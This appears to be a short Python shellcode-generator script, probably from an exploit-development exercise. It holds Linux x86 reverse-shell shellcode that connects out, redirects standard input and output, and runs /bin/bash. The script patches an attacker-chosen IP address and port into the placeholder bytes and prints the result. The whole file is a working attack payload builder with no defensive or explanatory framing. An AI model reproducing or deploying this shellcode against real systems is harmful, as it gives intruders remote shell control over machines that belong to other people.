#!/bin/python

import sys
import socket
import re
import binascii

shellcode = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x31\\xff\\x50\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xb3\\x01\\xcd\\x80\\x89\\xc7\\x52\\x52\\x68AABBCCDD\\x66\\x68EEFF\\x66\\x6a\\x02\\x89\\xe6\\x31\\xc0\\x31\\xdb\\x6a\\x10\\x56\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x03\\xcd\\x80\\x89\\xfb\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\xb0\\x3f\\xcd\\x80\\x41\\xb0\\x3f\\xcd\\x80\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\x31\\xd2\\xcd\\x80"


if len(sys.argv) < 3:
	print('ArgV1 : IP , Argv2 : Port')
	exit(1)


print("----------------------------------------------------------------------------")

ip = binascii.hexlify(socket.inet_aton(sys.argv[1]))

shellcode1=re.sub("AABBCCDD","\\x"+ip[0:2]+"\\x"+ip[2:4]+"\\x"+ip[4:6]+"\\x"+ip[6:8],shellcode)


p=sys.argv[2]
ph=hex(socket.htons(int(p)))

byte1 = ph[4:]
byte2 = ph[2:4]

shellcode1 = re.sub("EEFF","\\x"+byte1+"\\x"+byte2,shellcode1)

print('IP and Port Afer Conversion  '+ip+':'+ph+'  change ip and port if 0x0 or 0x00 is present')


print("----------------------------------------------------------------------------")


print('shellcode before :'+str(shellcode))

print(' ')

print('shellcode after:'+str(shellcode1))

